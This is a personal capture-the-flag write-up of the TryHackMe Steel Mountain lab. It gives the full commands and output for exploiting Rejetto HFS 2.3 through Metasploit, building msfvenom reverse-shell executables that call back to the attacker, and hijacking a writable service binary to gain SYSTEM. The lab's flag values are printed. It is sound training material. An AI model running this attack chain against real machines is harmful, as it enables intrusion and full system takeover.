#frst hint is to do a reverse image search - I am not sure how to so I looked it up:
looking at the source code there was the image link: /img/billharper.jpg
--> Bill Harper #was the answer


#initial nmap scan:
(kali㉿kali)-[~/THM/practice/steelmountain]
└─$ nmap -sV 10.10.220.76
Starting Nmap 7.91 ( https://nmap.org ) at 2022-02-01 13:10 EST
Nmap scan report for 10.10.220.76
Host is up (0.17s latency).
Not shown: 988 closed ports
PORT      STATE SERVICE            VERSION
80/tcp    open  http               Microsoft IIS httpd 8.5
135/tcp   open  msrpc              Microsoft Windows RPC
139/tcp   open  netbios-ssn        Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds       Microsoft Windows Server 2008 R2 - 2012 microsoft-ds
3389/tcp  open  ssl/ms-wbt-server?
8080/tcp  open  http               HttpFileServer httpd 2.3
49152/tcp open  msrpc              Microsoft Windows RPC
49153/tcp open  msrpc              Microsoft Windows RPC
49154/tcp open  msrpc              Microsoft Windows RPC
49155/tcp open  msrpc              Microsoft Windows RPC
49156/tcp open  msrpc              Microsoft Windows RPC
49163/tcp open  msrpc              Microsoft Windows RPC
Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 68.90 seconds


#going to http://10.10.220.76:8080 we get a page using the httpfileserver 2.3
        #doing a quick search on this the first result that comes up is the rejetto http file server 2.3 
        #Furthermore, the article is from exploit-db, so we immediately get the rigt CVE code too!
--> rejetto http file server (2.3)
--> CVE-2014-6287

#next step is to use metasploit to get an initial shell
#I am still quite unsure how to properly use metasploit ut I start out by running it and using the command show options

(kali㉿kali)-[~/THM/practice/steelmountain]
└─$ msfconsole

                                              `:oDFo:`
                                           ./ymM0dayMmy/.
                                        -+dHJ5aGFyZGVyIQ==+-
                                    `:sm⏣~~Destroy.No.Data~~s:`
                                 -+h2~~Maintain.No.Persistence~~h+-
                             `:odNo2~~Above.All.Else.Do.No.Harm~~Ndo:`
                          ./etc/shadow.0days-Data'%20OR%201=1--.No.0MN8'/.
                       -++SecKCoin++e.AMd`       `.-://///+hbove.913.ElsMNh+-
                      -~/.ssh/id_rsa.Des-                  `htN01UserWroteMe!-
                      :dopeAW.No<nano>o                     :is:TЯiKC.sudo-.A:
                      :we're.all.alike'`                     The.PFYroy.No.D7:
                      :PLACEDRINKHERE!:                      yxp_cmdshell.Ab0:
                      :msf>exploit -j.                       :Ns.BOB&ALICEes7:
                      :---srwxrwx:-.`                        `MS146.52.No.Per:
                      :<script>.Ac816/                        sENbove3101.404:
                      :NT_AUTHORITY.Do                        `T:/shSYSTEM-.N:
                      :09.14.2011.raid                       /STFU|wall.No.Pr:
                      :hevnsntSurb025N.                      dNVRGOING2GIVUUP:
                      :#OUTHOUSE-  -s:                       /corykennedyData:
                      :$nmap -oS                              SSo.6178306Ence:
                      :Awsm.da:                            /shMTl#beats3o.No.:
                      :Ring0:                             `dDestRoyREXKC3ta/M:
                      :23d:                               sSETEC.ASTRONOMYist:
                       /-                        /yo-    .ence.N:(){ :|: & };:
                                                 `:Shall.We.Play.A.Game?tron/
                                                 ```-ooy.if1ghtf0r+ehUser5`
                                               ..th3.H1V3.U2VjRFNN.jMh+.`
                                              `MjM~~WE.ARE.se~~MMjMs
                                               +~KANSAS.CITY's~-`
                                                J~HAKCERS~./.`
                                                .esc:wq!:`
                                                 +++ATH`
                                                  `


       =[ metasploit v6.1.4-dev                           ]
+ -- --=[ 2162 exploits - 1147 auxiliary - 367 post       ]
+ -- --=[ 592 payloads - 45 encoders - 10 nops            ]
+ -- --=[ 8 evasion                                       ]

Metasploit tip: Display the Framework log using the
log command, learn more with help log

msf6 > show options
#I was still unsure what exactly to do, but I know the web server is rejetto http, and the cve exploit
#so I went on to search for rejetto:
msf6 > search rejetto

Matching Modules
================

   #  Name                                   Disclosure Date  Rank       Check  Description
   -  ----                                   ---------------  ----       -----  -----------
   0  exploit/windows/http/rejetto_hfs_exec  2014-09-11       excellent  Yes    Rejetto HttpFileServer Remote Command Execution


Interact with a module by name or index. For example info 0, use 0 or use exploit/windows/http/rejetto_hfs_exec

#I got one exploit so I proceeded to 'use' this
#now, there is the standard reverse_tcp payload configured so I will just use this
#there are some requirements that I will have to set:
msf6 exploit(windows/http/rejetto_hfs_exec) > show options

Module options (exploit/windows/http/rejetto_hfs_exec):

   Name       Current Setting  Required  Description
   ----       ---------------  --------  -----------
   HTTPDELAY  10               no        Seconds to wait before terminating web server
   Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS                      yes       The target host(s), see https://github.com/rapid7/metasploit-fra
                                         mework/wiki/Using-Metasploit
   RPORT      80               yes       The target port (TCP)
   SRVHOST    0.0.0.0          yes       The local host or network interface to listen on. This must be a
                                         n address on the local machine or 0.0.0.0 to listen on all addre
                                         sses.
   SRVPORT    8080             yes       The local port to listen on.
   SSL        false            no        Negotiate SSL/TLS for outgoing connections
   SSLCert                     no        Path to a custom SSL certificate (default is randomly generated)
   TARGETURI  /                yes       The path of the web application
   URIPATH                     no        The URI to use for this exploit (default is random)
   VHOST                       no        HTTP server virtual host


Payload options (windows/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  process          yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     192.168.251.131  yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Automatic
#as shown, I needed to set the rhost (target IP) and rport (target port) 
msf6 exploit(windows/http/rejetto_hfs_exec) > set rhosts 10.10.220.76
rhosts => 10.10.220.76
msf6 exploit(windows/http/rejetto_hfs_exec) > set rport 8080
rport => 8080
msf6 exploit(windows/http/rejetto_hfs_exec) > run

[*] Started reverse TCP handler on 192.168.251.131:4444
[*] Using URL: http://0.0.0.0:8080/zQpxmfykyhb
[*] Local IP: http://192.168.251.131:8080/zQpxmfykyhb
[*] Server started.
[*] Sending a malicious request to /
[*] Server stopped.
[!] This exploit may require manual cleanup of '%TEMP%\jaThkyedYIwI.vbs' on the target
[*] Exploit completed, but no session was created.

#next steps now would be to upload some file to the web server and execute it, before accessing the reverse shell in the meterpreter
msf6 exploit(windows/http/rejetto_hfs_exec) > set RHOSTS 10.10.220.76
RHOSTS => 10.10.220.76
msf6 exploit(windows/http/rejetto_hfs_exec) > set RPORT 8080
RPORT => 8080
msf6 exploit(windows/http/rejetto_hfs_exec) > exploit

[*] Started reverse TCP handler on 192.168.251.131:4444
[*] Using URL: http://0.0.0.0:8080/qWaRJ1uQ1PW
[*] Local IP: http://192.168.251.131:8080/qWaRJ1uQ1PW
[*] Server started.
[*] Sending a malicious request to /
[*] Server stopped.
[!] This exploit may require manual cleanup of '%TEMP%\ONksOHpg.vbs' on the target
[*] Exploit completed, but no session was created.

#just doing these steps did not result in a meterpreter shell to be opened
#after trying some stuff I came to the realisation I had to change the LHOST to the IP address of the openvpn - 10.11.59.68
msf6 exploit(windows/http/rejetto_hfs_exec) > exploit

[*] Started reverse TCP handler on 10.11.59.68:4444
[*] Using URL: http://0.0.0.0:8080/BOqk6kpmgyFdX4
[*] Local IP: http://192.168.251.131:8080/BOqk6kpmgyFdX4
[*] Server started.
[*] Sending a malicious request to /
[*] Payload request received: /BOqk6kpmgyFdX4
[*] Sending stage (175174 bytes) to 10.10.220.76
[!] Tried to delete %TEMP%\WGKGLJiqBv.vbs, unknown result
[*] Meterpreter session 1 opened (10.11.59.68:4444 -> 10.10.220.76:49286) at 2022-02-01 13:54:43 -0500
[*] Server stopped.

meterpreter >

#I tried looking for the user.txt file:
meterpreter > ls
Listing: C:\Users\bill\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup
====================================================================================

Mode              Size    Type  Last modified              Name
----              ----    ----  -------------              ----
40777/rwxrwxrwx   4096    dir   2022-02-01 13:42:29 -0500  %TEMP%
100666/rw-rw-rw-  174     fil   2019-09-27 07:07:07 -0400  desktop.ini
100777/rwxrwxrwx  760320  fil   2019-09-27 05:24:35 -0400  hfs.exe

meterpreter > pwd
C:\Users\bill\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup
meterpreter > find / -name user.txt
[-] Unknown command: find
meterpreter >
#but the command did not work
#now the hihnt hinted to the directory 'C:\USers\bill\Desktop' so I went there:
#(had to do 'cd ..' x6...
meterpreter > cd Desktop
meterpreter > ls
Listing: C:\Users\bill\Desktop
==============================

Mode              Size  Type  Last modified              Name
----              ----  ----  -------------              ----
100666/rw-rw-rw-  282   fil   2019-09-27 07:07:07 -0400  desktop.ini
100666/rw-rw-rw-  70    fil   2019-09-27 08:42:38 -0400  user.txt

#when trying to cat the file I got some weird output, and I reliased I had not yet initialised a proper shell.. so I continued with:
meterpreter > shell
Process 2756 created.
Channel 3 created.
Microsoft Windows [Version 6.3.9600]
(c) 2013 Microsoft Corporation. All rights reserved.

C:\Users\bill\Desktop>ls
ls
'ls' is not recognized as an internal or external command,
operable program or batch file.

C:\Users\bill\Desktop>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is 2E4A-906A

 Directory of C:\Users\bill\Desktop

09/27/2019  08:08 AM    <DIR>          .
09/27/2019  08:08 AM    <DIR>          ..
09/27/2019  04:42 AM                70 user.txt
               1 File(s)             70 bytes
               2 Dir(s)  44,155,367,424 bytes free

C:\Users\bill\Desktop>type user.txt
type user.txt
b04763b6fcf51fcd7c13abc7db4fd365
#and got the flag
	










### PRIVILEGE ESCALATION ###

#the room says to use a powershell script calles PowerUp.ps1
#after quickly googling it it looks like its possible to clone it from github --> https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1
#I therefore proceeded to clone it and upload it to metasploit
(kali㉿kali)-[~]
└─$ sudo git clone https://github.com/PowerShellMafia/PowerSploit.git
[sudo] password for kali:
Cloning into 'PowerSploit'...
remote: Enumerating objects: 3086, done.
remote: Total 3086 (delta 0), reused 0 (delta 0), pack-reused 3086
Receiving objects: 100% (3086/3086), 10.47 MiB | 3.60 MiB/s, done.
Resolving deltas: 100% (1809/1809), done.

┌──(kali㉿kali)-[~]
└─$ ls
Desktop    Downloads   HTB    Pictures     Public  pwntools    shell.war   Templates  tools
Documents  flask_test  Music  PowerSploit  pwndbg  rshell.war  sqlmap-dev  THM        Videos

┌──(kali㉿kali)-[~]
└─$ cd PowerSploit

┌──(kali㉿kali)-[~/PowerSploit]
└─$ ls
AntivirusBypass  Exfiltration  mkdocs.yml        PowerSploit.psm1     Privesc    ScriptModification
CodeExecution    LICENSE       Persistence       PowerSploit.pssproj  README.md  Tests
docs             Mayhem        PowerSploit.psd1  PowerSploit.sln      Recon

┌──(kali㉿kali)-[~/PowerSploit]
└─$ cd Privesc

┌──(kali㉿kali)-[~/PowerSploit/Privesc]
└─$ ls
Get-System.ps1  PowerUp.ps1  Privesc.psd1  Privesc.psm1  README.md

#to upload it to metasploit I did the following:
C:\Users\bill\Desktop>^Z
Background channel 3? [y/N]  y

meterpreter > upload /home/kali/PowerSploit/Privesc/PowerUp.ps1
[*] uploading  : /home/kali/PowerSploit/Privesc/PowerUp.ps1 -> PowerUp.ps1
[*] Uploaded 586.50 KiB of 586.50 KiB (100.0%): /home/kali/PowerSploit/Privesc/PowerUp.ps1 -> PowerUp.ps1
[*] uploaded   : /home/kali/PowerSploit/Privesc/PowerUp.ps1 -> PowerUp.ps1

#next is to enter powershell so the scrpit can be executed:
meterpreter > load powershell
Loading extension powershell...Success.
meterpreter > powershell_shell
PS >

PS > ls


    Directory: C:\Users\bill\Desktop


Mode                LastWriteTime     Length Name
----                -------------     ------ ----
-a---          2/1/2022  11:14 AM     600580 PowerUp.ps1
-a---         9/27/2019   5:42 AM         70 user.txt

PS > . .\PowerUp.ps1
PS > Invoke-AllChecks


ServiceName    : AdvancedSystemCareService9
Path           : C:\Program Files (x86)\IObit\Advanced SystemCare\ASCService.exe
ModifiablePath : @{ModifiablePath=C:\; IdentityReference=BUILTIN\Users; Permissions=AppendData/AddSubdirectory}
StartName      : LocalSystem
AbuseFunction  : Write-ServiceBinary -Name 'AdvancedSystemCareService9' -Path <HijackPath>
CanRestart     : True
Name           : AdvancedSystemCareService9
Check          : Unquoted Service Paths

ServiceName    : AdvancedSystemCareService9
Path           : C:\Program Files (x86)\IObit\Advanced SystemCare\ASCService.exe
ModifiablePath : @{ModifiablePath=C:\; IdentityReference=BUILTIN\Users; Permissions=WriteData/AddFile}
StartName      : LocalSystem
AbuseFunction  : Write-ServiceBinary -Name 'AdvancedSystemCareService9' -Path <HijackPath>
CanRestart     : True
Name           : AdvancedSystemCareService9
Check          : Unquoted Service Paths

ServiceName    : AdvancedSystemCareService9
Path           : C:\Program Files (x86)\IObit\Advanced SystemCare\ASCService.exe
ModifiablePath : @{ModifiablePath=C:\Program Files (x86)\IObit; IdentityReference=STEELMOUNTAIN\bill;
                 Permissions=System.Object[]}
StartName      : LocalSystem
AbuseFunction  : Write-ServiceBinary -Name 'AdvancedSystemCareService9' -Path <HijackPath>
CanRestart     : True
Name           : AdvancedSystemCareService9
Check          : Unquoted Service Paths

ServiceName    : AdvancedSystemCareService9
Path           : C:\Program Files (x86)\IObit\Advanced SystemCare\ASCService.exe
ModifiablePath : @{ModifiablePath=C:\Program Files (x86)\IObit\Advanced SystemCare\ASCService.exe;
                 IdentityReference=STEELMOUNTAIN\bill; Permissions=System.Object[]}
StartName      : LocalSystem
AbuseFunction  : Write-ServiceBinary -Name 'AdvancedSystemCareService9' -Path <HijackPath>
CanRestart     : True
Name           : AdvancedSystemCareService9
Check          : Unquoted Service Paths

ServiceName    : AdvancedSystemCareService9
Path           : C:\Program Files (x86)\IObit\Advanced SystemCare\ASCService.exe
ModifiablePath : @{ModifiablePath=C:\Program Files (x86)\IObit\Advanced SystemCare\ASCService.exe;
                 IdentityReference=STEELMOUNTAIN\bill; Permissions=System.Object[]}
StartName      : LocalSystem
AbuseFunction  : Write-ServiceBinary -Name 'AdvancedSystemCareService9' -Path <HijackPath>
CanRestart     : True
Name           : AdvancedSystemCareService9
Check          : Unquoted Service Paths

ServiceName                     : AdvancedSystemCareService9
Path                            : C:\Program Files (x86)\IObit\Advanced SystemCare\ASCService.exe
ModifiableFile                  : C:\Program Files (x86)\IObit\Advanced SystemCare\ASCService.exe
ModifiableFilePermissions       : {WriteAttributes, Synchronize, ReadControl, ReadData/ListDirectory...}
ModifiableFileIdentityReference : STEELMOUNTAIN\bill
StartName                       : LocalSystem
AbuseFunction                   : Install-ServiceBinary -Name 'AdvancedSystemCareService9'
CanRestart                      : True
Name                            : AdvancedSystemCareService9
Check                           : Modifiable Service Files
	
#the only 'CanRestart' that is set to 'True' is for the 'AdvancedSystemCareService9' service
#this shows up as an 'unquoted service path' vulnerability
        #didnt know what it was so after looking it up:
        #When a service is created whose executable path contains spaces and isn't enclosed within quotes
        #allows a user to gain SYSTEM privileges (only if the vulnerable service is running with SYSTEM privilege level which most of the time it is) 
        #!!ITS BASICALLY LIKE PATH MANIPULATION IN LINUX!!#

#next step is therefore to use msfvenom to generate a reverse shell as a windows executable
#I inputted the code shown from the room:
(kali㉿kali)-[~/THM/practice/steelmountain]
└─$ msfvenom -p windows/shell_reverse_tcp LHOST=10.11.59.68 LPORT=4443 -e x86/shikata_ga_nai -f exe -o Advanced.exe
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
Found 1 compatible encoders
Attempting to encode payload with 1 iterations of x86/shikata_ga_nai
x86/shikata_ga_nai succeeded with size 351 (iteration=0)
x86/shikata_ga_nai chosen with final size 351
Payload size: 351 bytes
Final size of exe file: 73802 bytes
Saved as: Advanced.exe

#I honestly did not think this would work but it did
#now I have to upload this Advanced.exe to the meterpreter, restartthe program and then I should get root access
        ##NOTE --> this is not taking advantage of the service being unquotes - this exploits the weak file permissions instead
#1 I terminated the PS session with Ctrl + C
#2 (I had to exit and run the exploit again as the shell was slow)
#3:
meterpreter > upload /home/kali/THM/practice/steelmountain/Advanced.exe
[*] uploading  : /home/kali/THM/practice/steelmountain/Advanced.exe -> Advanced.exe
[*] Uploaded 72.07 KiB of 72.07 KiB (100.0%): /home/kali/THM/practice/steelmountain/Advanced.exe -> Advanced.exe
[*] uploaded   : /home/kali/THM/practice/steelmountain/Advanced.exe -> Advanced.exe
#4:
meterpreter > shell
Process 76 created.
Channel 3 created.
Microsoft Windows [Version 6.3.9600]
(c) 2013 Microsoft Corporation. All rights reserved.

C:\Users\bill\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup>

C:\Users\bill\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup>sc stop AdvancedSystemCareService9
sc stop AdvancedSystemCareService9

SERVICE_NAME: AdvancedSystemCareService9
        TYPE               : 110  WIN32_OWN_PROCESS  (interactive)
        STATE              : 4  RUNNING
                                (STOPPABLE, PAUSABLE, ACCEPTS_SHUTDOWN)
        WIN32_EXIT_CODE    : 0  (0x0)
        SERVICE_EXIT_CODE  : 0  (0x0)
        CHECKPOINT         : 0x0
        WAIT_HINT          : 0x0

#5 I coped it into the path of the systemcareservice:
C:\Users\bill\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup>copy Advanced.exe "\Program Files (x86)\IObit\Advanced SystemCare\Advanced.exe"
copy Advanced.exe "\Program Files (x86)\IObit\Advanced SystemCare\Advanced.exe"
        1 file(s) copied.

#6 set up a nc listener before reastarting --> need to catch the shell
(kali㉿kali)-[~/THM/practice/steelmountain]
└─$ nc -nvlp 4443
listening on [any] 4443 ...

#7 - restart the service:
C:\Users\bill\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup>sc start AdvancedSystemCareService9
sc start AdvancedSystemCareService9

SERVICE_NAME: AdvancedSystemCareService9
        TYPE               : 110  WIN32_OWN_PROCESS  (interactive)
        STATE              : 2  START_PENDING
                                (NOT_STOPPABLE, NOT_PAUSABLE, IGNORES_SHUTDOWN)
        WIN32_EXIT_CODE    : 0  (0x0)
        SERVICE_EXIT_CODE  : 0  (0x0)
        CHECKPOINT         : 0x0
        WAIT_HINT          : 0x7d0
        PID                : 1876
        FLAGS              :

#it did not work for me - I did not get a shell..

#I changed directories and ran the following:
C:\Users\bill\Documents>wmic service get name,displayname,pathname,startmode  |findstr /i "auto" | findstr /i /v "C:\windows\\" |findstr /i /v """
wmic service get name,displayname,pathname,startmode  |findstr /i "auto" | findstr /i /v "C:\windows\\" |findstr /i /v """
Advanced SystemCare Service 9                           AdvancedSystemCareService9  C:\Program Files (x86)\IObit\Advanced SystemCare\ASCService.exe                    Auto
AWS Lite Guest Agent                                    AWSLiteAgent                C:\Program Files\Amazon\XenTools\LiteAgent.exe                                     Auto
IObit Uninstaller Service                               IObitUnSvr                  C:\Program Files (x86)\IObit\IObit Uninstaller\IUService.exe                       Auto
LiveUpdate                                              LiveUpdateSvc               C:\Program Files (x86)\IObit\LiveUpdate\LiveUpdate.exe                             Auto

#remade the malicious binary:
(kali㉿kali)-[~/THM/practice/steelmountain]
└─$ msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.11.59.68 LPORT=9999 -f exe > Advanced1.exe                                                 2 ⨯
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
No encoder specified, outputting raw payload
Payload size: 354 bytes
Final size of exe file: 73802 bytes

#stopped the service again (it was already stopped)
#uploaded the new binary
C:\Users\bill\Documents>exit
exit
meterpreter > upload /home/kali/THM/practice/steelmountain/Advanced1.exe
[*] uploading  : /home/kali/THM/practice/steelmountain/Advanced1.exe -> Advanced1.exe
[*] Uploaded 72.07 KiB of 72.07 KiB (100.0%): /home/kali/THM/practice/steelmountain/Advanced1.exe -> Advanced1.exe
[*] uploaded   : /home/kali/THM/practice/steelmountain/Advanced1.exe -> Advanced1.exe

#moved it to the right diretory:
C:\Users\bill\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup>copy Advanced1.exe "\Program Files (x86)\IObit\Advanced SystemCare\ASCService.exe"
copy Advanced.exe "\Program Files (x86)\IObit\Advanced SystemCare\ASCService.exe"
Overwrite \Program Files (x86)\IObit\Advanced SystemCare\ASCService.exe? (Yes/No/All): yes
yes
        1 file(s) copied.


C:\Users\bill\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup>cd \Users\bill\Documents
cd \Users\bill\Documents

C:\Users\bill\Documents>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is 2E4A-906A

 Directory of C:\Users\bill\Documents

09/27/2019  03:07 AM    <DIR>          .
09/27/2019  03:07 AM    <DIR>          ..
               0 File(s)              0 bytes
               2 Dir(s)  44,154,212,352 bytes free

C:\Users\bill\Documents>sc start AdvancedSystemCareService9
sc start AdvancedSystemCareService9

#and it sortof worked but no sessoin made
#replace the advanced1 wih adavcned and execute it from documents and its a go!!:
#port 4443
(kali㉿kali)-[~/THM/practice/steelmountain]
└─$ nc -nlvp 4443
listening on [any] 4443 ...
connect to [10.11.59.68] from (UNKNOWN) [10.10.220.76] 49360
Microsoft Windows [Version 6.3.9600]
(c) 2013 Microsoft Corporation. All rights reserved.

C:\Windows\system32>

#I looked around and FINALLY found the flag!!:
C:\Users\Administrator\Desktop>type root.txt
type root.txt
9af5f314f57607c00fd09803a587db80